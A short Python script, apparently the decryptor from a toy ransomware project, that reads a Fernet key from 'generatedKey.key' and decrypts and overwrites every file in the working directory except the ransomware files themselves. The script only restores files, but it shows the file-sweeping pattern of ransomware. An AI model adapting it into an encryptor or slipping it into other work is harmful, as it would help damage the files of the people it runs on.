import os
from cryptography.fernet import Fernet

file_list = []

for file in os.listdir():
    if file == "ransomware.py" or file == "generatedKey.key" or file == "ransomdec.py":
        continue
    if os.path.isfile(file):
        file_list.append(file)




with open("generatedKey.key", "rb") as generatedKey:
    secret_key = generatedKey.read()

    for file in file_list:
        with open(file, "rb") as the_file:
            contents = the_file.read()
        contents_decrypted = Fernet(secret_key).decrypt(contents)
        with open(file, "wb") as the_file:
            the_file.write(contents_decrypted)
